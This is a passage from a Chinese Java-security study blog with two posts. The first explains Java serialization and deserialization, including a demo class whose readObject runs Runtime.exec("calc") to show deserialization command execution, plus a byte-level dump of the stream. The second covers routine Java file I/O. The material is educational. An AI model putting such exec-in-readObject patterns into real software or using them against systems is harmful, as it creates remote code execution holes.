class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *ClassName: DeserializeTest</span><br><span class="hljs-comment"> *Description: A Class for learning Serialize and Deserialize</span><br><span class="hljs-comment"> *Author: zZ</span><br><span class="hljs-comment"> *Time: 2022/7/27</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">/*序列化后的数据可以设为一个byte数组流，也可以写入文件；无论套哪个流，oos都需要writeObject-&gt;flush-&gt;close*/</span><br>            <span class="hljs-comment">//ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br>            DeserializeTest t = <span class="hljs-keyword">new</span> DeserializeTest();<br>            t.setEmail(<span class="hljs-string">&quot;admin@gmail.com&quot;</span>);<br>            t.setUsername(<span class="hljs-string">&quot;Georg&quot;</span>);<br><br>            <span class="hljs-comment">//使用ObjectOutputStream套入baos并写入到流中</span><br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            oos.writeObject(t);<br>            oos.flush();<br>            oos.close();<br><br><br>            <span class="hljs-comment">//System.out.println(&quot;Deserialization:&quot;+ Arrays.toString(baos.toByteArray()));</span><br>            <span class="hljs-comment">//ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br>            <span class="hljs-comment">//ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            DeserializeTest deObject = (DeserializeTest) ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;username:&quot;</span>+deObject.username+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+deObject.email);<br>            ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，但需要重写<code>writeExternal、readExternal</code></p><p>如果重写/恶意构造反序列化方法，可能导致命令执行</p><p>对上述代码进行改编：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *ClassName: DeserializeTest</span><br><span class="hljs-comment"> *Description: A Class for learning Serialize and Deserialize</span><br><span class="hljs-comment"> *Author: zZ</span><br><span class="hljs-comment"> *Time: 2022/7/27</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br>            DeserializeTest t = <span class="hljs-keyword">new</span> DeserializeTest();<br>            t.setEmail(<span class="hljs-string">&quot;admin@gmail.com&quot;</span>);<br>            t.setUsername(<span class="hljs-string">&quot;Georg&quot;</span>);<br><br>            <span class="hljs-comment">//使用ObjectOutputStream套入baos并写入到流中</span><br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            oos.writeObject(t);<br>            oos.flush();<br>            oos.close();<br><br><br>            <span class="hljs-comment">//System.out.println(&quot;Deserialization:&quot;+ Arrays.toString(baos.toByteArray()));</span><br>            <span class="hljs-comment">//ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br>            <span class="hljs-comment">//ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./2.txt&quot;</span>)));<br>            DeserializeTest deObject = (DeserializeTest) ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;username:&quot;</span>+deObject.username+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+deObject.email);<br>            ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>readObject()</code>可以被恶意构造的或者反序列化链能够控制到<code>-&gt;readObject()</code>就能RCE了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-title">A</span><span class="hljs-params">(String username,<span class="hljs-keyword">int</span> id)</span></span>&#123;<span class="hljs-keyword">this</span>.username=username;<span class="hljs-keyword">this</span>.id=id;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        oos.defaultWriteObject();<br>        oos.writeObject(<span class="hljs-string">&quot;i add the string here&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        System.out.println((String) ois.readObject());<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeAtt</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            A a = <span class="hljs-keyword">new</span> A(<span class="hljs-string">&quot;Georg&quot;</span>, <span class="hljs-number">12</span>);<br>            ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>            oos.writeObject(a);<br>            oos.flush();<br>            oos.close();<br><br>            ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>            ois.readObject();<br>ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这边需要获取其16进制的序列化数据，那么可以文件写出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-title">A</span><span class="hljs-params">(String username,<span class="hljs-keyword">int</span> id)</span></span>&#123;<span class="hljs-keyword">this</span>.username=username;<span class="hljs-keyword">this</span>.id=id;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        oos.defaultWriteObject();<br>        oos.writeObject(<span class="hljs-string">&quot;i add the string here&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ois.defaultReadObject();<br>        System.out.println((String) ois.readObject());<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeAtt</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            A a = <span class="hljs-keyword">new</span> A(<span class="hljs-string">&quot;Georg&quot;</span>, <span class="hljs-number">12</span>);<br><span class="hljs-comment">//            ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//            ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br>            <br>            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./1&quot;</span>)));<br>            <br>            oos.writeObject(a);<br>            oos.flush();<br>            oos.close();<br><br><span class="hljs-comment">//            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//            ObjectInputStream ois = new ObjectInputStream(bais);</span><br>            <br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;./1&quot;</span>)));<br>            ois.readObject();<br>ois.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件1得到其16进制数值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">λ java -jar SerializationDumper-v1.13.jar <span class="hljs-string">&quot;ACED00057372000B6D796A6176617365632E4197F88148C57B592E 03000249000269644C0008757365726E616D657400124C6A6176612F6C616E672F537472696E673B78700000000C74000547656F726774001569206164642074686520737472696E67206865726578&quot;</span><br><br>STREAM_MAGIC - 0xac ed<br>STREAM_VERSION - 0x00 05<br>Contents<br>  TC_OBJECT - 0x73<br>    TC_CLASSDESC - 0x72<br>      className<br>        Length - 11 - 0x00 0b<br>        Value - myjavasec.A - 0x6d796a6176617365632e41<br>      serialVersionUID - 0x97 f8 81 48 c5 7b 59 2e<br>      newHandle 0x00 7e 00 00<br>      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE<br>      fieldCount - 2 - 0x00 02<br>      Fields<br>        0:<br>          Int - I - 0x49<br>          fieldName<br>            Length - 2 - 0x00 02<br>            Value - id - 0x6964<br>        1:<br>          Object - L - 0x4c<br>          fieldName<br>            Length - 8 - 0x00 08<br>            Value - username - 0x757365726e616d65<br>          className1<br>            TC_STRING - 0x74<br>              newHandle 0x00 7e 00 01<br>              Length - 18 - 0x00 12<br>              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b<br>      classAnnotations<br>        TC_ENDBLOCKDATA - 0x78<br>      superClassDesc<br>        TC_NULL - 0x70<br>    newHandle 0x00 7e 00 02<br>    classdata<br>      myjavasec.A<br>        values<br>          id<br>            (int)12 - 0x00 00 00 0c<br>          username<br>            (object)<br>              TC_STRING - 0x74<br>                newHandle 0x00 7e 00 03<br>                Length - 5 - 0x00 05<br>                Value - Georg - 0x47656f7267<br>        objectAnnotation<br>          TC_STRING - 0x74<br>            newHandle 0x00 7e 00 04<br>            Length - 21 - 0x00 15<br>            Value - i add the string here - 0x69206164642074686520737472696e672068657265<br>          TC_ENDBLOCKDATA - 0x78<br></code></pre></td></tr></table></figure><p>可见自定义的<code>writeObject</code>写入的<code>i add the string here</code>放在了<code>objectAnnotation</code>，在反序列化时，自定义的恶意<code>readObject</code>进行了<code>exec</code>并且也读取到了这个字符串</p><blockquote><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是 ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用 readObject ，开发者也可以从中读取出前面写入的内容，并进行处理</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java读写文件</title>
    <link href="/2023/03/15/Java%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/"/>
    <url>/2023/03/15/Java%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Java读写文件"><a href="#Java读写文件" class="headerlink" title="Java读写文件"></a>Java读写文件</h1><p><a href="https://blog.csdn.net/jingzi123456789/article/details/72123937">Java流参考</a></p><h2 id="java-io-FileSystem"><a href="#java-io-FileSystem" class="headerlink" title="java.io.FileSystem"></a>java.io.FileSystem</h2><p>FileInputStream类读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">//打开文件对象并创建文件输入流</span><br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;C:\\Windows\\System32\\drivers\\etc\\hosts&quot;</span>);<br>        <span class="hljs-comment">//定义每次输入流读取到的字节数对象</span><br>        <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//定义缓冲区大小</span><br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-comment">//创建byte数组输出对象</span><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-comment">//循环读取，read(bytes)方法返回本次读取到的字节个数，且将读取到的字节存储到bytes中，或当到达文件尾部时返回-1</span><br>        <span class="hljs-keyword">while</span> ((a=fileInputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-comment">//输入流read即a写入bytes数组(数组下标从0开始)</span><br>            byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,a);<br>        &#125;<br>        System.out.println(byteArrayOutputStream.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>FileOutputStream类写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<span class="hljs-comment">//这样不会创建出文件，必须FileOutputStream.write方法写出文件</span><br>        String content = <span class="hljs-string">&quot;Nothing is better than learning&quot;</span>;<br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>        fileOutputStream.write(content.getBytes());<br>        fileOutputStream.flush();<br>        fileOutputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再介绍缓冲IO流</p><p>BufferedInputStream类读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;D:/1.txt&quot;</span>);<br>        BufferedInputStream bufferedInputStream = <span class="hljs-keyword">new</span> BufferedInputStream(fileInputStream);<br>        String content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> flag = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((flag=bufferedInputStream.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>            content=<span class="hljs-keyword">new</span> String(buffer,<span class="hljs-number">0</span>,flag);<br>        &#125;<br>        System.out.println(content);<br>        bufferedInputStream.close();<span class="hljs-comment">//只需要关闭最外层的流即可</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>BufferedInputStream包装了一个FileInputStream，那么先关BufferedInputStream，再关FileInputStream。一般处理流持有节点流引用，处理流都会在自己的close方法中去关闭节点流，因此我们只要关闭外层的处理流即可，所以只要关闭BufferedInputStream即可</p></blockquote><p>BufferedOutputStream类写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;D:/2.txt&quot;</span>);<br>        BufferedOutputStream bufferedOutputStream = <span class="hljs-keyword">new</span> BufferedOutputStream(fileOutputStream);<br>        String contents = <span class="hljs-string">&quot;hello world&quot;</span>;<br>        bufferedOutputStream.write(contents.getBytes());<br>        bufferedOutputStream.flush();<br>        bufferedOutputStream.close();<span class="hljs-comment">//只需要关闭最外层的流即可</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h2><p>读和写文件需要new两个类，并且方法并不多，使用RandomAccessFile可以更方便</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220316214144844.png"></p><p>构造函数中可见有四种模式，并且有丰富的读写方法</p><p>使用的时候只需要改变包装file流为RandomAccessFile，并且指定模式即可</p><p>写文件的模式值得注意，追加还是覆盖要慎重</p><h2 id="FileSystemProvider"><a 